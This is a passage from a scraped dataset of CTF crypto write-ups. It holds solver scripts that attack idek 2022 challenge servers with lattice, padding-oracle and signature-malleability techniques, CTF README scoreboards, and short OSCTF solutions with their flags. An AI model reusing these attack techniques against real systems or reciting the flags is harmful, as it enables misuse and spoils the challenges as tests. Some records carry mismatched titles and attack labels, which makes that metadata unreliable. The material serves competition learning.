\n#order=E1.order()*E2.order()\norder=148789535372424163728266646450060056789282887632409478972504939920226619164296671910830162422173521086104260442096339694304886999126003562791358712412416317442287195786906697615489065379945573862193455179868067475036156124279466870451072060581891741234837916854904063588317305400955406105882208744056825746850\nprint(order)\ndd=invert(3,order)\nprint(long_to_bytes(ZZ((E(Me)*dd)[0])))\n'''\nb\"It is UNBREAKABLE, I tell you!! I'll even bet a flag on it, here it is: idek{Sh3_s3ll5_5n4k3_01l_0n_7h3_5e4_5h0r3}\"\n'''\n\n#sage\nfrom pwn import *\nimport itertools\nfrom Crypto.Util.number import *\n\ndef small_roots(f, bounds, m=2, d=None):\n    if not d:\n        d = f.degree()\n\n    R = f.base_ring()\n    N = R.cardinality()\n\n    f /= f.coefficients().pop(0)\n    f = f.change_ring(ZZ)\n\n    G = Sequence([], f.parent())\n    for i in range(m+1):\n        base = N^(m-i) * f^i\n        for shifts in itertools.product(range(d), repeat=f.nvariables()):\n            g = base * prod(map(power, f.variables(), shifts))\n            G.append(g)\n\n    B, monomials = G.coefficient_matrix()\n    monomials = vector(monomials)\n\n    factors = [monomial(*bounds) for monomial in monomials]\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, factor)\n\n    B = B.dense_matrix().LLL()\n\n    B = B.change_ring(QQ)\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, 1/factor)\n\n    H = Sequence([], f.parent().change_ring(QQ))\n    for h in filter(None, B*monomials):\n        H.append(h)\n        I = H.ideal()\n        if I.dimension() == -1:\n            H.pop()\n        elif I.dimension() == 0:\n            roots = []\n            for root in I.variety(ring=ZZ):\n                root = tuple(R(root[var]) for var in f.variables())\n                roots.append(root)\n            return roots\n\n    return []\n\ncontext.log_level=\"debug\"\n#s=process(['python3','oracle.py'])\ns=remote(\"chronophobia.chal.idek.team\",1337)\ns.recvuntil(b'Here is your random token: ')\nt=int(s.recvline()[:-1].decode())\ns.recvuntil(b'The public modulus is: ')\nn=int(s.recvline()[:-1].decode())\ns.recvuntil(b'Do 2^')\nd=int(s.recvline()[:3].decode())\nfac=[t,pow(t,2,n)]\nH=[]\nB=[]\nfor i in range(2):\n    s.recvuntil(b'>>> ')\n    s.sendline(b'1')\n    s.recvuntil(b'Tell me the token. ')\n    s.sendline(str(fac[i]).encode())\n    s.recvuntil(b'What is your calculation? ')\n    s.sendline(b'1')\n    s.recvuntil(b'Nope, the ans is ')\n    tmp=int(s.recvuntil(b'... (')[:-5].decode())\n    bits=int(s.recvline()[:3].decode())\n    H.append(tmp)\n    B.append(bits)\n\n\nP.<x,y>=PolynomialRing(Zmod(n))\n\n\nf1=H[0]*10**B[0]+x\nf2=H[1]*10**B[1]+y\nf=f1^2-f2\nroots=small_roots(f,(10**B[0],10**B[1]),m=4,d=4)[0]\nroots=(roots[0],roots[1])\nc1=roots[0]+H[0]*10**B[0]\nc2=roots[1]+H[1]*10**B[1]\nassert (c1^2-c2)%n==0\n\ns.recvuntil(b'>>> ')\ns.sendline(b'1')\ns.recvuntil(b'Tell me the token. ')\ns.sendline(str(t).encode())\ns.recvuntil(b'What is your calculation? ')\ns.sendline(str(c1).encode())\ns.recvline()\n\ns.recvuntil(b'>>> ')\ns.sendline(b'2')\ns.recvuntil(b'Give me the ticket. ')\ns.sendline(str(c1).encode())\ns.recvline()\n\ns.recvuntil(b'>>> ')\ns.sendline(b'3')\ns.recvline()\n\n#idek{St@rburst_str3@m!!!}\n\nfrom pwn import *\nfrom Crypto.Util.number import *\n\n# context.log_level = \"debug\"\nio = connect(\"megalophobia.chal.idek.team\", 1337)\n\nio.recvuntil(b\"::\\n|    \")\ndata = io.recvline().strip().decode()\npub, sec = data.split(\"::\")\ne = 0x10001\n\nn = int(pub, 16)\nsec = bytes.fromhex(sec)\nprint(f\"{n = }\")\nprint(sec)\n\nu_len = 0x40\ntarget_u_len = 0x39\nu_len_pos = (2 + 64) * 2 + 2 + 128 + 1\n\nsec = list(sec)\nsec[u_len_pos] ^= target_u_len ^ u_len\n\nsec = bytes(sec)\n\nio.recvuntil(b\"> (hex)\")\nio.sendline(sec.hex().encode())\n\nl = 1 << 511\nr = 2 * l -1\n\nfor i in range(500):\n    io.recvuntil(b\"|  > \")\n    mid = (l+r)//2\n    if i % 20 == 0:\n        print(hex(mid))\n    now = pow(mid, e, n)\n    io.sendline(long_to_bytes(now).hex().encode())\n    res = io.recvline()\n    if b\"Q_Q\" in res:\n        l = mid + 1\n    else:\n        r = mid \nprint(f\"{n = }\")\nprint(f\"{l = }\")\nprint(f\"{r = }\")\nprint(f\"{sec = }\")\nio.interactive()\n\nd = 47\nM = Matrix(GF(2),47,47)\ntaps = [47, 43, 41, 37, 31, 29, 23, 19, 17, 13, 11, 7, 5, 3, 2]\nfor _ in range(d - 1):\n    M[_+1,_] = 1\nfor _ in taps:\n    M[47-_,-1] = 1\n\n# states = vector(GF(2),) 中间有个47bits的states，恢复出来即可\ntimes1 = 1160\nM_tmp = M**((times1-1)*512)\nnew_mat1 = Matrix(GF(2),d,512)\nfor i in range(512):\n    for j in range(d):\n        new_mat1[j,i] = M_tmp[j,0]\n    M_tmp *= M\n\n# 往后推q的关系，比如说输出是[LOG]447\ntimes2 = 447\nM_tmp = M_tmp * M**((times2-1)*512)\nnew_mat2 = Matrix(GF(2),d,512)\nfor i in range(512):\n    for j in range(d):\n        new_mat2[j,i] = M_tmp[j, 0]\n    M_tmp *= M\n\nfor j in range(30):\n    for i in range(d):\n        print(new_mat1[i, j], end = \" \")\n    print()\n\nwith open(\"mat1.txt\", \"w\") as f:\n     for i in new_mat1.T:\n         l = []\n         for j in i:\n             l.append(str(int(j)))\n         f.write(\" \".join(l)+\"\\n\")\n\nwith open(\"mat2.txt\", \"w\") as f:\n     for i in new_mat2.T:\n         l = []\n         for j in i:\n             l.append(str(int(j)))\n         f.write(\" \".join(l)+\"\\n\")\n\nfrom Crypto.Util.number import *\nimport random\n\nn = 78189483779073760819769596415493404181115737255987326126790953924148600157623709942134043192581448967829591214999561812461790206591977861764710056434977125005626712442593271233036617073503751799983263888626278748439349756982639988997517983470845431197233107232933125334078771472039280629203017666578936360521\n\nlast = []\nbinn = bin(n)[2:]\nfor i in range(24):\n    x = binn[-(i + 1) : ]\n    last.append(int(x, 2))\n\ndef dfs(p, cur, x):\n\n    global ans\n\n    if x == 24:\n        ans.append((p[-1], int(cur, 2)))\n        return\n\n    _p = p[x]\n    _n = last[x]\n\n    t = \"0\" + \"\".join(cur)\n    _q = int(t, 2)\n    if ((_p * _q) & ((1 << (x+1)) - 1)) == _n:\n        dfs(p, \"0\" + cur, x + 1)\n\n    t = \"1\" + \"\".join(cur)\n    _q = int(t, 2)\n    if ((_p * _q) & ((1 << (x+1)) - 1)) == _n:\n        dfs(p, \"1\" + cur, x + 1)\n\nans = []\n\nfor i in range(1 << 24):\n    cur = \"\"\n    p = []\n    binp = bin(i)[2:]\n    binp = ((24 - len(binp)) * \"0\") + binp\n    for j in range(24):\n        p.append(int(binp[-(j+1) : ], 2))\n    dfs(p, cur, 0)\n\nwith open(\"pq.txt\", \"w\") as f:\n    for p, q in ans:\n        f.write(str(p) + \" \" + str(q) + \"\\n\")\n\np = 8148641146281585626599965707019875487540363795516672614500530970713004312213378852992447549855928600229171345524388095399807768385341698813126095446000969\nq = 9595401536948702154260950703331322993513137152314157248261000347717193558940157103084976690783331034882701052399602064548436624663369151807143327408382209\nenc = 39952631182502523101053953538875437560829302998610236142339435591980522271590392249355510253125310494063081880512061476177621613835835483055753316172267380484804011034657479491794064534740537749793563744927827732170347495398050941609682485707331552759412916426691849669362897656967530464847648838434750188588\nphi = (p-1) * (q-1)\nfrom Crypto.Util.number import *\ne = inverse(0x10001, phi)\nm = pow(enc, e, p*q)\nprint(long_to_bytes(m))\n# b'idek{th3_prim3_g3n3r4ti0n_is_c001_but_n0t_s3cur3_QAQ}\\n'\n\nfrom hashlib import sha256\nfrom netcat import *\nfrom Crypto.Util.number import *\nfrom ast import literal_eval\n\ndef fix(r, s):\n    rs = 0\n    idx = []\n    gcds = []\n    for i in range(8):\n        si = (s + i * (O // 8)) % O\n        u1 = (h * inverse(si, O)) % O\n        u2 = (r * inverse(si, O)) % O\n        if GCD(si, O) == 4 or GCD(si, O) == 8:\n            idx.append(i)\n            gcds.append(GCD(si, O))\n    if idx[0] == 0:\n        x = idx[1]\n    elif idx[0] == 1:\n        if gcds[0] == 4:\n            x = idx[0]\n        else:\n            x = idx[1]\n    elif idx[0] == 2:\n        if gcds[0] == 4:\n            x = idx[1]\n        else:\n            x = idx[0]\n    elif idx[0] == 3:\n        if gcds[0] == 4:\n            x = idx[0]\n        else:\n            x = idx[1]\n    fix_s = (s + x * (O // 8)) % O\n    return fix_s\n\nP = 2**255 - 19\nA = 486662\nB = 1\n# Order of the Curve\nO = 57896044618658097711785492504343953926856930875039260848015607506283634007912\n\nwhile True:\n    host, port = 'psychophobia.chal.idek.team 1337'.split(' ')\n    io = remote(host, int(port))\n    io.recvuntil(b\"|    > \")\n    io.sendline(b\"1\")\n    msg = \"1 here, requesting flag for pick-up.\"\n    h = int.from_bytes(sha256(msg.encode()).digest(), 'big')\n    for round in range(500):\n        print(f\"round-{round}\")\n        io.recvuntil(b'Please fix :: ')\n        tmp = io.recvline()\n        sig = literal_eval(tmp.strip().decode())\n        r, s = sig\n        fix_s = fix(r, s)\n        io.recvuntil(b'|    > (r,s) ')\n        io.sendline(f'{r},{fix_s}'.encode())\n\n    io.recvuntil(b\"signatures!\\n\")\n    io.recvline()\n    tmp = io.recvline()\n    print(tmp)\n    if b\"{\" in tmp:\n        print(\"get flag!\")\n        io.close()\n        input()\n    else:\n        io.close()", "url": "https://github.com/r3kapig/writeup/blob/writeup/20230120-idek2022-Web_Crypto/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:14.090250", "synthetic": false}
{"id": "kalmarunionenctf_kalmarctf_874bc3f6c75b", "team": "kalmarunionenctf", "event": "kalmarctf", "challenge_name": "README", "challenge_description": "# KalmarCTF 2025\n\nThis repository contains the source code for (some of) the challenges from KalmarCTF. Challenges will gradually be uploaded here after the CTF ends. If you want to see some specific challenges, please reach out to us through https://kalmarunionen.dk or social media.\n\nWe hope you had a blast and we are already looking forward to organizing KalmarCTF 2026!\n\n## Scoreboard\n\nCongrats to the winning teams!\n🥇 - organizers\n🥈 - Blue Water\n🥉 - Tower of Hanoi\n4️⃣ - r3kapig\n5️⃣ - about:bla...", "attack_type": "Hash", "tools_used": [], "difficulty": "unknown", "writeup": "# KalmarCTF 2025\n\nThis repository contains the source code for (some of) the challenges from KalmarCTF. Challenges will gradually be uploaded here after the CTF ends. If you want to see some specific challenges, please reach out to us through https://kalmarunionen.dk or social media.\n\nWe hope you had a blast and we are already looking forward to organizing KalmarCTF 2026!\n\n## Scoreboard\n\nCongrats to the winning teams!\n🥇 - organizers\n🥈 - Blue Water\n🥉 - Tower of Hanoi\n4️⃣ - r3kapig\n5️⃣ - about:blankets\n6️⃣ - The Flat Network Society\n\n## Challenges\n\n|Challenge  name               |Category  |# solves |\n|---                           |---       |---      |\n|laconic                       |crypto    |0        |\n|lance-hard?                   |crypto    |2        |\n|short circuit                 |crypto    |4        |\n|ZZKAoK                        |crypto    |6        |\n|MonoDOOM                      |crypto    |8        |\n|Not-so-complex multiplication |crypto    |77       |\n|basic sums                    |crypto    |83       |\n|Very Serious Cryptography     |crypto    |107      |\n|Paper Viper                   |misc      |2        |\n|Pycomment                     |misc      |2        |\n|RWX - Diamond                 |misc      |3        |\n|nix-build as a service        |misc      |6        |\n|RWX - Gold                    |misc      |12       |\n|babyKalmarCTF                 |misc      |107      |\n|RWX - Silver                  |misc      |169      |\n|RWX - Bronze                  |misc      |224      |\n|Maestro Revenge               |pwn       |4        |\n|KalmarVM                      |pwn       |5        |\n|loadall.js                    |pwn       |8        |\n|decore                        |pwn       |10       |\n|Merger                        |pwn       |15       |\n|Snake III - Hungry for Snake  |rev       |0        |\n|Snake II - Sonic Snake Fighter II|rev    |0        |\n|Shafus Gone Crazy             |rev       |1        |\n|Jormungandr                   |rev       |10       |\n|Shafus                        |rev       |16       |\n|FlagSecurityEngine            |rev       |41       |\n|Snake I - Just One More Apple |rev       |62       |\n|spukhafte Fernwirkung         |web       |0        |\n|No SQLi                       |web       |3        |\n|Red wEDDIng                   |web       |8        |\n|KalmarDSL                     |web       |14       |\n|G0tchaberg                    |web       |25       |\n|KalmarNotes                   |web       |51       |\n|DNXSS-over-HTTPS              |web       |57       |\n|Ez ⛳ v3                      |web       |93       |\n", "solution_code": "", "url": "https://github.com/kalmarunionenctf/kalmarctf/blob/main/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:16.752193", "synthetic": false}
{"id": "project-sekai-ctf_sekaictf-2025_3c640b59799d", "team": "project-sekai-ctf", "event": "sekaictf-2025", "challenge_name": "README", "challenge_description": "# Cryptography\n\n<img src=\"https://2024.ctf.sekai.team/themes/luna-vite/static/img/categories/Crypto.svg\" align=\"right\" width=300>\n\n| Name                                        | Author          | Difficulty  | Solves |                                                               Bounty ($USD) |\n| ------------------------------------------- | --------------- | ----------- | -----: | --------------------------------------------------------------------------: |\n| [**SSSS**](ssss)                 ...", "attack_type": "Unknown", "tools_used": [], "difficulty": "unknown", "writeup": "# Cryptography\n\n<img src=\"https://2024.ctf.sekai.team/themes/luna-vite/static/img/categories/Crypto.svg\" align=\"right\" width=300>\n\n| Name                                        | Author          | Difficulty  | Solves |                                                               Bounty ($USD) |\n| ------------------------------------------- | --------------- | ----------- | -----: | --------------------------------------------------------------------------: |\n| [**SSSS**](ssss)                            | Utaha           | 1⯁ (Easy)   |    236 |                                                                             |\n| [**I Dream of Genni**](i-dream-of-genni)    | Neobeo          | 2⯁ (Normal) |    124 |                                                                             |\n| [**Alter Ego**](alter-ego)                  | kanon           | 3⯁ (Hard)   |      7 |                                                                             |\n| [**APES**](apes)                            | Neobeo          | 4⯁ (Expert) |      3 |                                                                             |\n| [**Law And Order**](law-and-order)          | deuterium       | 4⯁ (Expert) |      0 | (Bad handout) <img src=\"https://files.catbox.moe/743j1s.png\" width=20> $400 |\n| [**unfairy-ring**](unfairy-ring)            | Neobeo, Sceleri | 5⯁ (Master) |      0 |               <img src=\"https://files.catbox.moe/743j1s.png\" width=20> $100 |\n| [**unfairy-ring++**](unfairy-ring-plusplus) | Sceleri, Neobeo | 6✦ (Append) |      0 |               <img src=\"https://files.catbox.moe/743j1s.png\" width=20> $200 |\n", "solution_code": "", "url": "https://github.com/project-sekai-ctf/sekaictf-2025/blob/main/crypto/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:19.591180", "synthetic": false}
{"id": "project-sekai-ctf_sekaictf-2024_386aed12bab3", "team": "project-sekai-ctf", "event": "sekaictf-2024", "challenge_name": "README", "challenge_description": "# Cryptography\n\n<img src=\"https://2024.ctf.sekai.team/themes/luna-vite/static/img/categories/Crypto.svg\" align=\"right\" width=300>\n\n| Name                                            | Author     | Difficulty | Solves |\n| ----------------------------------------------- | ---------- | ---------- | ------ |\n| [Some Trick](some-trick)                        | deut-erium | Easy (1)   | 127    |\n| [はやぶさ](hayabusa) (Hayabusa)                 | kanon      | Hard (3)   | 38     |\n| [マスタースパーク](master-spark...", "attack_type": "Unknown", "tools_used": [], "difficulty": "unknown", "writeup": "# Cryptography\n\n<img src=\"https://2024.ctf.sekai.team/themes/luna-vite/static/img/categories/Crypto.svg\" align=\"right\" width=300>\n\n| Name                                            | Author     | Difficulty | Solves |\n| ----------------------------------------------- | ---------- | ---------- | ------ |\n| [Some Trick](some-trick)                        | deut-erium | Easy (1)   | 127    |\n| [はやぶさ](hayabusa) (Hayabusa)                 | kanon      | Hard (3)   | 38     |\n| [マスタースパーク](master-spark) (Master Spark) | kanon      | Hard (3)   | 23     |\n| [Squares vs. Cubes](squares-vs-cubes)           | Neobeo     | Expert (4) | 2      |\n| [√163](sqrt163)                                 | Neobeo     | Master (5) | 3      |\n| [zerodaycrypto](zerodaycrypto)                  | Neobeo     | Append (6) | 4      |\n", "solution_code": "", "url": "https://github.com/project-sekai-ctf/sekaictf-2024/blob/main/crypto/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:22.446611", "synthetic": false}
{"id": "justcatthefish_justctf-2023_1290ce354c52", "team": "justcatthefish", "event": "justctf-2023", "challenge_name": "README", "challenge_description": "# justCTF 2023\n\nThis repo contains sources for [justCTF 2023](https://2023.justctf.team) challenges hosted by [justCatTheFish](https://ctftime.org/team/33893) as well as summary of winners and sponsors of the event.\n\nTLDR: Run a challenge with `./run.sh` (requires Docker/docker-compose and might require `sudo` as we use `nsjail` extensively under the hood).\n\nThe [`challenges/`](./challenges/) contains challanges directories with the following structure:\n* `README.md` - official challenge descrip...", "attack_type": "ECC", "tools_used": [], "difficulty": "unknown", "writeup": "# justCTF 2023\n\nThis repo contains sources for [justCTF 2023](https://2023.justctf.team) challenges hosted by [justCatTheFish](https://ctftime.org/team/33893) as well as summary of winners and sponsors of the event.\n\nTLDR: Run a challenge with `./run.sh` (requires Docker/docker-compose and might require `sudo` as we use `nsjail` extensively under the hood).\n\nThe [`challenges/`](./challenges/) contains challanges directories with the following structure:\n* `README.md` - official challenge description used during CTF\n* `public/` - files that were public/to download\n* `private/` - sources and other unlisted files\n* `private/run.sh` - shell script to run the challenge locally (uses Docker and sometimes docker-compose)\n* `private/flag.txt` - the flag (don't look there?)\n* `private/metadata.json` - challenge metadata\n* `private/solve.sh`/`private/solver/` - scripts and files with raw solution (not present for every challenge)\n* other files\n\n\n### Winners & Prizes\n* 1st place - [r3kapig](https://ctftime.org/team/58979) - $3200\n* 2nd place - [Never Stop Exploiting](https://ctftime.org/team/13575) - $1500\n* 3rd place - [SKSD](https://ctftime.org/team/211952) - $1000\n\n### justCTF 2023 sponsors:\n* Trail of Bits - https://www.trailofbits.com/\n* OtterSec - https://osec.io/\n* SECFORCE - https://www.secforce.com/\n* isec - https://www.isec.pl/\n\nThanks again to all the sponsors who made this event possible!\n\n### Challenges\n\n(Sorted from most solved to least solved)\n\n| Category  | Name                       | Points | Solves |\n|-----------|----------------------------|--------|--------|\n| Misc      | Sanity check               | 50     | 261    |\n| Misc      | ECC for Dummies            | 88     | 138    |\n| Misc      | justCTF Survey             | 140    | 87     |\n| Pwn       | Welcome in my house        | 158    | 74     |\n| Web       | eXtra Safe Security layers | 173    | 65     |\n| Crypto    | Vaulted                    | 199    | 51     |\n| Re        | Rustberry                  | 201    | 50     |\n| Web       | Dangerous                  | 231    | 38     |\n| Re        | manGO                      | 253    | 31     |\n| Pwn       | nucleus                    | 256    | 30     |\n| Misc      | ECC not only for Dummies   | 293    | 21     |\n| Misc, Pwn | PyPlugins                  | 298    | 20     |\n| Web       | Perfect Product            | 340    | 13     |\n| Re        | nvm                        | 355    | 11     |\n| Pwn       | Baby Otter                 | 363    | 10     |\n| Crypto    | Multi Auth                 | 373    | 9      |\n| Pwn       | Mystery locker             | 373    | 9      |\n| Web       | Aquatic Delights           | 373    | 9      |\n| Pwn       | notabug                    | 373    | 9      |\n| Web       | Phantom                    | 373    | 9      |\n| Web       | Easy Cloud Auth            | 406    | 6      |\n| Web       | almost finished            | 406    | 6      |\n| Pwn       | notabug2                   | 420    | 5      |\n| Pwn       | Tic Tac PWN!               | 435    | 4      |\n| Re        | Trial of Data              | 453    | 3      |\n| Re        | thiefcat                   | 453    | 3      |\n| Web       | ESSAMTP                    | 500    | 1      |\n| Misc, Web | Safeblog                   | 500    | 1      |\n| Web       | almost finished2           | 500    | 1      |\n| Misc      | Formula L                  | 500    | 1      |\n| Misc      | Secure DB                  | 500    | 0      |\n| Pwn       | Windytooth                 | 500    | 0      |\n| Re        | Trial of Bugs              | 500    | 0      |\n\n\n### Write-ups\nWrite-ups created by players can be found on [CTFTime](https://ctftime.org/event/1930/tasks/) as well as on [our discord](https://discord.gg/phyqdh6). \nYou should also look at challenges solution directories, if they exist (`solver.sh`/`solver/`).\n\n### CTF Platform\nOnce again we used our own CTF platform which is available [here](https://github.com/justcatthefish/ctfplatform) with the exception of few features (notably the message system) not being pushed upstream at the time of publishing.\n", "solution_code": "", "url": "https://github.com/justcatthefish/justctf-2023/blob/main/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:25.117144", "synthetic": false}
{"id": "justcatthefish_justctf-2022_755b5ed86446", "team": "justcatthefish", "event": "justctf-2022", "challenge_name": "README", "challenge_description": "# justCTF 2022\n\nThis repo contains sources for [justCTF 2022](https://2022.justctf.team) challenges hosted by [justCatTheFish](https://ctftime.org/team/33893) as well as summary of winners and sponsors of the event.\n\nTLDR: Run a challenge with `./run.sh` (requires Docker/docker-compose and might require `sudo` as we use `nsjail` extensively under the hood).\n\nThe [`challenges/`](./challenges/) contains challanges directories with the following structure:\n* `README.md` - official challenge descrip...", "attack_type": "Hash", "tools_used": [], "difficulty": "unknown", "writeup": "# justCTF 2022\n\nThis repo contains sources for [justCTF 2022](https://2022.justctf.team) challenges hosted by [justCatTheFish](https://ctftime.org/team/33893) as well as summary of winners and sponsors of the event.\n\nTLDR: Run a challenge with `./run.sh` (requires Docker/docker-compose and might require `sudo` as we use `nsjail` extensively under the hood).\n\nThe [`challenges/`](./challenges/) contains challanges directories with the following structure:\n* `README.md` - official challenge description used during CTF\n* `run.sh` - shell script to run the challenge locally (uses Docker and sometimes docker-compose)\n* `public/` - files that were public/to download\n* `private/` - sources and other unlisted files\n* `flag.txt`/`metadata.json` - the flag (don't look there?)\n* `solv/` - scripts and files with raw solution (used by healthcheck, if exists)\n* other files\n\n\n### Winners & Prizes\n* 1st place - [C4T BuT S4D](https://ctftime.org/team/83435) - $3200 + 1x Binary Ninja Personal\n* 2nd place - [Never Stop Exploiting](https://ctftime.org/team/13575) $1500 + 1x Binary Ninja Personal\n* 3rd place - [0ops](https://ctftime.org/team/4419) - $1000 + 1x Binary Ninja Personal\n* 4-8th place - [DiceGang](https://ctftime.org/team/109452), [r3kapig](https://ctftime.org/team/58979), [Water Paddler](https://ctftime.org/team/155019), [idek](https://ctftime.org/team/157039) - 1x Binary Ninja Personal\n\n* We also give a 1x Binary Ninja Personal license for the best writeup that uses Binary Ninja\n* We also provided  $50 for each of the two unsolved challenges to the first winners\n\n### justCTF 2022 sponsors:\n* Sumo Logic - https://www.sumologic.com/\n* Trail of Bits - https://www.trailofbits.com/\n* Vector35 (Binary Ninja) - https://vector35.com/\n\nThanks again to all the sponsors who made this event possible!\n\n### Challenges\n\n(Sorted from most solved to least solved)\n\n| Category | Name | Points | Solves |\n|----------|------|--------|--------|\n| Misc | Sanity Check | 50 | 316 |\n| Misc | Bifurcation (ppc) | 103 | 121 |\n| Web | Symple Unzipper | 225 | 40 |\n| Crypto | Frosty | 228 | 39 |\n| Pwn | Notes | 256 | 30 |\n| Crypto | Simply Powered | 260 | 29 |\n| Pwn | arm | 267 | 27 |\n| Crypto | fROSty's Second Signature Scheme | 275 | 25 |\n| Misc | Hardware Screen | 279 | 24 |\n| Re | I'm slow | 283 | 23 |\n| Web | Velociraptor | 288 | 22 |\n| Misc | Radio Ga Ga | 288 | 22 |\n| Web | GoBucket | 308 | 18 | \n| Misc, Pwn | dumpme | 333 | 14 |\n| Pwn | Skilltest | 340 | 13 | \n| Web, Misc | gitara | 347 | 12 |\n| Pwn | League of Lamports | 373 | 9 |\n| Web | Baby XSLeak | 394 | 7 |\n| Re | AMXX | 406 | 6 |\n| Re, Pwn | Monsters | 406 | 6 |\n| Web | Foreigner | 420 | 5 |\n| Pwn | herpetology | 435 | 4 |\n| Web, Misc | Web API intended | 435 | 4 |\n| Re, Misc | Fancy Device | 453 | 3 |\n| Web | Ninja | 500 | 1 |\n| Pwn | Dark SOLs | 500 | 0 |\n| Web | Dank Shark | 500 | 0 |\n\n\n### Write-ups\nWrite-ups can be found on [CTFTime](https://ctftime.org/event/1631/tasks/). You should also look at challenges solution directories, if they exist (`solv/`).\n\n### CTF Platform\nWe wrote our own CTF platform which is available [here](https://github.com/justcatthefish/ctfplatform).\n\n", "solution_code": "", "url": "https://github.com/justcatthefish/justctf-2022/blob/main/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:27.807894", "synthetic": false}
{"id": "cryptonite-mit_Write-ups_2c24edc62b62", "team": "cryptonite-mit", "event": "Write-ups", "challenge_name": "README", "challenge_description": "# Write-ups\nCryptonite is the official ethical hacking and cybersecurity team of Manipal Institute of Technology. At Cryptonite, our areas of focus are cryptography, forensics, research, reverse engineering and web exploitation. We compete in various CTFs, and this repository will be an ordered method to record our progress and write-ups on.\n", "attack_type": "Unknown", "tools_used": [], "difficulty": "unknown", "writeup": "# Write-ups\nCryptonite is the official ethical hacking and cybersecurity team of Manipal Institute of Technology. At Cryptonite, our areas of focus are cryptography, forensics, research, reverse engineering and web exploitation. We compete in various CTFs, and this repository will be an ordered method to record our progress and write-ups on.\n", "solution_code": "", "url": "https://github.com/Cryptonite-MIT/Write-ups/blob/master/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:32.155173", "synthetic": false}
{"id": "bitskrieg_OSCTF_2024_Write-ups_beccd001397d", "team": "bitskrieg", "event": "OSCTF_2024_Write-ups", "challenge_name": "Cipher Conundrum", "challenge_description": "# Cipher Conundrum\n\n## Solution\n- Base64 decode\n- Hex decode\n- Rotation cipher with numbers included\n\n## Flag\n```\nOSCTF{5o_M3nY_C1ph3Rsssss}\n```", "attack_type": "Encoding", "tools_used": [], "difficulty": "unknown", "writeup": "# Cipher Conundrum\n\n## Solution\n- Base64 decode\n- Hex decode\n- Rotation cipher with numbers included\n\n## Flag\n```\nOSCTF{5o_M3nY_C1ph3Rsssss}\n```", "solution_code": "", "url": "https://github.com/bitskriegofficial/OSCTF_2024_Write-ups/blob/main/crypto/Cipher%20Conundrum.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:35.380097", "synthetic": false}
{"id": "bitskrieg_OSCTF_2024_Write-ups_3e8dcb12bbf6", "team": "bitskrieg", "event": "OSCTF_2024_Write-ups", "challenge_name": "Efficient RSA", "challenge_description": "# Efficient RSA\n## Solution\n- Small $n$\n- Factorize $n$ to get $p$ and $q$\n\n## Script\n```python\nn = 13118792276839518668140934709605545144220967849048660605948916761813\ne = 65537\nc = 8124539402402728939748410245171419973083725701687225219471449051618\n\np = 3058290486427196148217508840815579\nq = n // p\n\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nm = pow(c, d, n)\nprint(m.to_bytes(100).decode())\n```\n\n## Flag\n```\nOSCTF{F4ct0r1Ng_F0r_L1f3}\n```", "attack_type": "RSA", "tools_used": [], "difficulty": "unknown", "writeup": "# Efficient RSA\n## Solution\n- Small $n$\n- Factorize $n$ to get $p$ and $q$\n\n## Script\n```python\nn = 13118792276839518668140934709605545144220967849048660605948916761813\ne = 65537\nc = 8124539402402728939748410245171419973083725701687225219471449051618\n\np = 3058290486427196148217508840815579\nq = n // p\n\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nm = pow(c, d, n)\nprint(m.to_bytes(100).decode())\n```\n\n## Flag\n```\nOSCTF{F4ct0r1Ng_F0r_L1f3}\n```", "solution_code": "n = 13118792276839518668140934709605545144220967849048660605948916761813\ne = 65537\nc = 8124539402402728939748410245171419973083725701687225219471449051618\n\np = 3058290486427196148217508840815579\nq = n // p\n\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nm = pow(c, d, n)\nprint(m.to_bytes(100).decode())", "url": "https://github.com/bitskriegofficial/OSCTF_2024_Write-ups/blob/main/crypto/Efficient%20RSA.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:36.146376", "synthetic": false}
{"id": "bitskrieg_OSCTF_2024_Write-ups_b216bfc1bd4c", "team": "bitskrieg", "event": "OSCTF_2024_Write-ups", "challenge_name": "Love Story", "challenge_description": "# Efficient RSA\n## Solution\n- Brute force\n\n## Script\n```python\ntar = \"KJOL_T_ZCTS_ZV_CQKLX_NDFKZTUC\"\n\nm = ''\nfor _ in range(len(tar)):\n    for i in range(128):\n        letter = chr(i)\n        if not letter.isalpha():\n            c = letter\n        else:\n            temp = ord(letter) - 65\n            c = chr((temp + _) % 26 + 65)\n        if c == tar[_]:\n            m += letter\n            break\n\nprint(m)\n```\n\n## Flag\n```\nOSCTF{KIMI_O_SUKI_NI_NATTE_SHIMATTA.}\n```", "attack_type": "RSA", "tools_used": [], "difficulty": "unknown", "writeup": "# Efficient RSA\n## Solution\n- Brute force\n\n## Script\n```python\ntar = \"KJOL_T_ZCTS_ZV_CQKLX_NDFKZTUC\"\n\nm = ''\nfor _ in range(len(tar)):\n    for i in range(128):\n        letter = chr(i)\n        if not letter.isalpha():\n            c = letter\n        else:\n            temp = ord(letter) - 65\n            c = chr((temp + _) % 26 + 65)\n        if c == tar[_]:\n            m += letter\n            break\n\nprint(m)\n```\n\n## Flag\n```\nOSCTF{KIMI_O_SUKI_NI_NATTE_SHIMATTA.}\n```", "solution_code": "tar = \"KJOL_T_ZCTS_ZV_CQKLX_NDFKZTUC\"\n\nm = ''\nfor _ in range(len(tar)):\n    for i in range(128):\n        letter = chr(i)\n        if not letter.isalpha():\n            c = letter\n        else:\n            temp = ord(letter) - 65\n            c = chr((temp + _) % 26 + 65)\n        if c == tar[_]:\n            m += letter\n            break\n\nprint(m)", "url": "https://github.com/bitskriegofficial/OSCTF_2024_Write-ups/blob/main/crypto/Love%20Story.md", "year": 2024, "category": "crypto", "file_type": ".md", 